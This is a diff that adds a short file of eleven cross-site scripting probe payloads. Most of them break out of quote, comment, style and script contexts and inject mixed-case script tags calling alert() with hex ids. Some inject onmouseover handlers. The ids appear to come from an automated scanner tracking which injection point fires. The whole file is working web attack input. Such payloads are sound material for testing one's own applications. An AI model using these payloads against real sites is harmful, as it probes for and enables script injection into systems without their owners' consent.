@@ -1,0 +1,11 @@
+'"--></style></scRipt><scRipt>alert(0x000936)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x0044C4)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x00690C)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x00D064)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x00687C)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x00D33A)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x00627A)</scRipt>
+'"--></style></scRipt><scRipt>alert(0x001D34)</scRipt>
+: '" onmouseover= alert(0x000C5A)
+'" onmouseover= alert(0x0000DE)
+/"onmouseover="alert(0x00170E)
